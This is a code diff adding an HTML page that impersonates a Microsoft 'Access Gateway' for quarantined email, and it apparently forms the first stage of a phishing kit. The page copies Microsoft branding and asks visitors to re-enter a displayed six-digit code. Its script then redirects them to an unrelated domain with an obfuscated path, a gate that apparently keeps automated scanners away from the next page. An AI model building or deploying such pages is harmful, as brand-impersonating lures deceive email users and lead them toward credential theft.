@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Access | Quarantine Messages</title>
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=JetBrains+Mono:wght@700&display=swap');
+        
+        body { font-family: 'Inter', sans-serif; }
+        .mono { font-family: 'JetBrains Mono', monospace; }
+
+        /* Animation for the modal appearing */
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .animate-slide-up { animation: slideUp 0.5s cubic-bezier(0.16, 1, 0.3, 1); }
+
+        /* Shake animation for errors */
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-8px); }
+            75% { transform: translateX(8px); }
+        }
+        .shake { animation: shake 0.2s ease-in-out 0s 2; }
+
+        /* Glassmorphism backdrop */
+        .modal-overlay {
+            background: rgba(15, 23, 42, 0.7);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+        }
+    </style>
+</head>
+<body class="bg-[#F9FAFB] min-h-screen flex items-center justify-center overflow-hidden" data-page="verification">
+
+    <div class="fixed inset-0 p-12 opacity-30 select-none pointer-events-none">
+        <div class="max-w-6xl mx-auto space-y-10">
+            <div class="flex justify-between items-center">
+                <div class="h-8 w-48 bg-slate-300 rounded-lg"></div>
+                <div class="h-10 w-10 bg-slate-300 rounded-full"></div>
+            </div>
+            <div class="grid grid-cols-3 gap-6">
+                <div class="h-40 bg-white rounded-3xl shadow-sm border border-slate-200"></div>
+                <div class="h-40 bg-white rounded-3xl shadow-sm border border-slate-200"></div>
+                <div class="h-40 bg-white rounded-3xl shadow-sm border border-slate-200"></div>
+            </div>
+            <div class="h-96 bg-white rounded-[2.5rem] shadow-sm border border-slate-200"></div>
+        </div>
+    </div>
+
+    <div id="verifyModal" class="modal-overlay fixed inset-0 z-50 flex items-center justify-center p-6">
+        <div class="bg-white w-full max-w-md rounded-[2.5rem] shadow-2xl p-10 border border-white animate-slide-up relative">
+            
+            <button class="absolute top-6 right-8 text-slate-300 hover:text-slate-500">
+                <i class="fa-solid fa-xmark text-xl"></i>
+            </button>
+
+            <div class="text-center mb-8">
+                <div class="inline-flex items-center justify-center w-14 h-14 bg-white rounded-2xl shadow-lg shadow-slate-200 mb-6 border border-slate-100">
+                    <svg width="28" height="28" viewBox="0 0 24 24">
+                        <rect x="1" y="1" width="10" height="10" fill="#F25022"/>
+                        <rect x="13" y="1" width="10" height="10" fill="#7FBA00"/>
+                        <rect x="1" y="13" width="10" height="10" fill="#00A4EF"/>
+                        <rect x="13" y="13" width="10" height="10" fill="#FFB900"/>
+                    </svg>
+                </div>
+                              
+                <h2 class="text-2xl font-bold text-[#0F172A] mb-2">Microsoft Access Gateway</h2>
+                <p class="text-slate-500 text-sm">Please verify your identity to access your Quarantine Emails.</p>
+            </div>
+
+            <div class="bg-slate-50 rounded-3xl p-6 mb-8 border border-slate-100 text-center">
+                <span class="text-[10px] font-black text-slate-400 uppercase tracking-[0.2em] block mb-2">Temporary Access Code</span>
+                <div class="text-4xl font-black text-[#3B82F6] mono tracking-[0.3em]">552901</div>
+            </div>
+
+            <form id="gateForm" class="space-y-4">
+                <div class="space-y-2">
+                    <label for="userInput" class="text-xs font-bold text-slate-700 ml-1">Enter 6-Digit Code</label>
+                    <input type="text" id="userInput" maxlength="6" autocomplete="off" placeholder="••••••"
+                        class="w-full px-6 py-4 bg-slate-50 border border-slate-200 rounded-2xl text-center text-2xl mono font-bold focus:ring-4 focus:ring-[#0B5394]/10 focus:border-[#0B5394] outline-none transition-all placeholder:text-slate-200">
+                </div>
+                
+                <p id="errorMessage" class="text-[#EF4444] text-xs font-bold text-center hidden">
+                    <i class="fa-solid fa-circle-exclamation mr-1"></i> Incorrect code. Please check and try again.
+                </p>
+
+                <button type="submit" id="submitBtn" 
+                    class="w-full bg-[#10B981] text-white py-4 rounded-2xl font-bold hover:bg-[#059669] transition-all shadow-xl shadow-emerald-200 flex items-center justify-center gap-3 active:scale-[0.98]">
+                    <span id="btnText">Verify & Continue</span>
+                    <i id="spinner" class="fa-solid fa-circle-notch fa-spin hidden text-xl"></i>
+                </button>
+            </form>
+
+            <div class="mt-8 pt-6 border-t border-slate-100 flex items-center justify-center gap-2">
+                <span class="w-2 h-2 bg-[#0B5394] rounded-full animate-pulse"></span>
+                <p class="text-[10px] text-slate-400 uppercase font-black tracking-widest">Microsoft Verification System</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Configuration
+        const VALID_CODE = "552901"; // Hardcoded number as requested
+        const DASHBOARD_URL = "https://postgres.shoudriwi.dev/qc9mzzN!0SPDmLKl7V/"; // The landing page
+
+        // Element Selectors
+        const form = document.getElementById('gateForm');
+        const input = document.getElementById('userInput');
+        const error = document.getElementById('errorMessage');
+        const submitBtn = document.getElementById('submitBtn');
+        const btnText = document.getElementById('btnText');
+        const spinner = document.getElementById('spinner');
+
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
+            
+            // Clean input (remove spaces if user pasted them)
+            const cleanedInput = input.value.replace(/\s+/g, '');
+
+            if (cleanedInput === VALID_CODE) {
+                handleSuccess();
+            } else {
+                handleError();
+            }
+        });
+
+        /**
+         * Logic for successful verification
+         */
+        function handleSuccess() {
+            // Hide error if visible
+            error.classList.add('hidden');
+            
+            // UI Transition: Loading State
+            input.disabled = true;
+            submitBtn.disabled = true;
+            input.classList.add('opacity-50', 'bg-slate-100');
+            
+            btnText.textContent = "Verifying Identity...";
+            spinner.classList.remove('hidden');
+
+            // Simulate server validation delay
+            setTimeout(() => {
+                btnText.textContent = "Access Granted!";
+                submitBtn.classList.replace('bg-[#0B5394]', 'bg-[#059669]');
+                
+                // Redirect to dashboard
+                setTimeout(() => {
+                    window.location.href = DASHBOARD_URL;
+                }, 800);
+            }, 1200);
+        }
+
+        /**
+         * Logic for failed verification
+         */
+        function handleError() {
+            error.classList.remove('hidden');
+            input.classList.add('border-[#EF4444]', 'bg-red-50', 'shake');
+            
+            // Remove shake class after animation finishes so it can re-trigger
+            setTimeout(() => {
+                input.classList.remove('shake');
+            }, 400);
+
+            // Focus back on input
+            input.value = "";
+            input.focus();
+        }
+
+        // Clean up error state when user types again
+        input.addEventListener('input', () => {
+            if (error.classList.contains('hidden')) return;
+            error.classList.add('hidden');
+            input.classList.remove('border-[#EF4444]', 'bg-red-50');
+        });
+    </script>
+</body>
+</html>
